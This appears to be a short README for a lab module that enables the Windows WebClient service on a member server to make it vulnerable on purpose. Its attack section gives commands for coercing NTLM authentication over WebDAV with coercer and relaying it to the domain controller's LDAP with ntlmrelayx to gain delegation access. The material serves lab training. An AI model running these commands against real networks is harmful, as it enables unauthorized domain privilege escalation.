# webdav

WebDAV client (WebClient service) installed and running on a member server. Sets `net.webclient` to `present` on a host providing `member_server`.

Attack:

Coerce the host over HTTP (WebDAV) and relay to LDAP, where SMB signing does not apply:

    coercer coerce -l <attacker>@80/x -t <host ip> ...
    ntlmrelayx.py -t ldap://<dc ip> --delegate-access

How to verify:

    Get-Service WebClient   # Running when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
